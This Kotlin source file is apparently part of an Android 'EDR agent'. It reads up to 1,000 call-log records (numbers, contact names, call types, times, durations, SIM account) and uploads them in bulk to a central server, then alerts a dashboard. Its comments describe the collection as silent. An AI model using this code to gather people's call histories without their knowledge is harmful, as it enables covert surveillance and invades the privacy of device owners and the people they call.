package com.edr.agent.telemetry

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Build
import android.provider.CallLog
import android.util.Log
import androidx.core.content.ContextCompat
import com.edr.agent.network.EdrHttpClient
import com.edr.agent.service.EdrForegroundService
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Data model for a single phone call history record.
 */
data class CallLogRecord(
    val callId: String,
    val phoneNumber: String,
    val callerName: String?,
    val callType: String,      // INCOMING, OUTGOING, MISSED, REJECTED, BLOCKED, UNKNOWN
    val timestamp: Long,       // epoch ms
    val callDate: String,      // YYYY-MM-DD
    val durationSeconds: Long, // Duration in seconds
    val formattedDuration: String, // e.g. "3m 45s", "0s (Missed)"
    val simSlot: String? = null
)

/**
 * Autonomous Phone History & Call Duration Harvester for EDR.
 *
 * Silently reads CallLog.Calls with exact call durations, timestamps, and caller details,
 * and securely synchronizes them to the central EDR server.
 */
object CallLogHarvester {
    private const val TAG = "CallLogHarvester"
    private val gson = Gson()
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()
    private val httpClient = EdrHttpClient.apiClient

    /**
     * Checks if READ_CALL_LOG permission is currently granted.
     */
    fun hasPermission(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED
    }

    /**
     * Harvests up to [limit] recent phone call history records from the Android system.
     */
    fun harvestCallLogs(context: Context, limit: Int = 1000): List<CallLogRecord> {
        if (!hasPermission(context)) {
            Log.w(TAG, "Cannot harvest call logs: READ_CALL_LOG permission not granted.")
            return emptyList()
        }

        val records = mutableListOf<CallLogRecord>()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd", Locale.US)

        val projection = arrayOf(
            CallLog.Calls._ID,
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                CallLog.Calls.PHONE_ACCOUNT_ID
            } else {
                CallLog.Calls._ID
            }
        )

        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                "${CallLog.Calls.DATE} DESC LIMIT $limit"
            )

            if (cursor != null && cursor.moveToFirst()) {
                val idIdx = cursor.getColumnIndex(CallLog.Calls._ID)
                val numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
                val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
                val simIdx = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    cursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
                } else -1

                do {
                    val callId = if (idIdx >= 0) cursor.getString(idIdx) ?: "" else ""
                    val rawNumber = if (numberIdx >= 0) cursor.getString(numberIdx) ?: "" else ""
                    val callerName = if (nameIdx >= 0) cursor.getString(nameIdx) else null
                    val rawType = if (typeIdx >= 0) cursor.getInt(typeIdx) else 0
                    val callDateMs = if (dateIdx >= 0) cursor.getLong(dateIdx) else 0L
                    val durationSec = if (durationIdx >= 0) cursor.getLong(durationIdx) else 0L
                    val simSlot = if (simIdx >= 0) cursor.getString(simIdx) else null

                    val callType = mapCallType(rawType)
                    val formattedDuration = formatDuration(durationSec, callType)
                    val callDateStr = if (callDateMs > 0) dateFormat.format(Date(callDateMs)) else ""

                    records.add(
                        CallLogRecord(
                            callId = callId,
                            phoneNumber = rawNumber,
                            callerName = callerName?.takeIf { it.isNotBlank() },
                            callType = callType,
                            timestamp = callDateMs,
                            callDate = callDateStr,
                            durationSeconds = durationSec,
                            formattedDuration = formattedDuration,
                            simSlot = simSlot
                        )
                    )
                } while (cursor.moveToNext())
            }

            Log.i(TAG, "Harvested ${records.size} call history records from device.")
        } catch (e: Exception) {
            Log.e(TAG, "Error harvesting call logs: ${e.message}", e)
        } finally {
            cursor?.close()
        }

        return records
    }

    /**
     * Harvests and uploads phone history to central EDR backend on a background thread.
     */
    fun harvestAndUpload(context: Context, callback: ((Boolean, Int) -> Unit)? = null) {
        Thread {
            try {
                val records = harvestCallLogs(context)
                if (records.isEmpty()) {
                    callback?.invoke(true, 0)
                    return@Thread
                }

                val deviceId = SyncPreferences.deviceId
                val baseUrl = SyncPreferences.httpBaseUrl
                if (deviceId.isEmpty() || baseUrl.isEmpty()) {
                    callback?.invoke(false, 0)
                    return@Thread
                }

                val payload = mapOf(
                    "deviceId" to deviceId,
                    "callLogs" to records
                )

                val body = gson.toJson(payload).toRequestBody(jsonMediaType)
                val request = Request.Builder()
                    .url("$baseUrl/api/call-logs/upload")
                    .post(body)
                    .build()

                val response = httpClient.newCall(request).execute()
                val success = response.isSuccessful
                val code = response.code
                response.close()

                if (success) {
                    Log.i(TAG, "Successfully uploaded ${records.size} phone history records to EDR server.")
                    EdrLocalStorage.appendEdrLog(
                        context,
                        "CALL_SYNC",
                        "Synchronized ${records.size} call records with duration metrics to central vault."
                    )

                    // Also broadcast via WebSocket so dashboard updates instantly
                    val wsMsg = mapOf(
                        "type" to "CALL_LOGS_SYNCED",
                        "deviceId" to deviceId,
                        "payload" to mapOf(
                            "count" to records.size,
                            "latestTimestamp" to (records.firstOrNull()?.timestamp ?: 0L)
                        ),
                        "timestamp" to SyncPreferences.getCurrentIsoTimestamp()
                    )
                    EdrForegroundService.instance?.sendWebSocketMessage(gson.toJson(wsMsg))

                    callback?.invoke(true, records.size)
                } else {
                    Log.e(TAG, "Server rejected call log upload: HTTP $code")
                    callback?.invoke(false, 0)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed harvesting/uploading call logs: ${e.message}", e)
                callback?.invoke(false, 0)
            }
        }.start()
    }

    private fun mapCallType(rawType: Int): String {
        return when (rawType) {
            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
            CallLog.Calls.MISSED_TYPE -> "MISSED"
            CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
            CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
            else -> "UNKNOWN"
        }
    }

    private fun formatDuration(durationSec: Long, callType: String): String {
        if (durationSec <= 0L) {
            return when (callType) {
                "MISSED" -> "0s (Missed)"
                "REJECTED" -> "0s (Rejected)"
                "BLOCKED" -> "0s (Blocked)"
                else -> "0s"
            }
        }
        val hours = durationSec / 3600
        val minutes = (durationSec % 3600) / 60
        val seconds = durationSec % 60
        return when {
            hours > 0 -> String.format(Locale.US, "%dh %02dm %02ds", hours, minutes, seconds)
            minutes > 0 -> String.format(Locale.US, "%dm %02ds", minutes, seconds)
            else -> "${seconds}s"
        }
    }
}
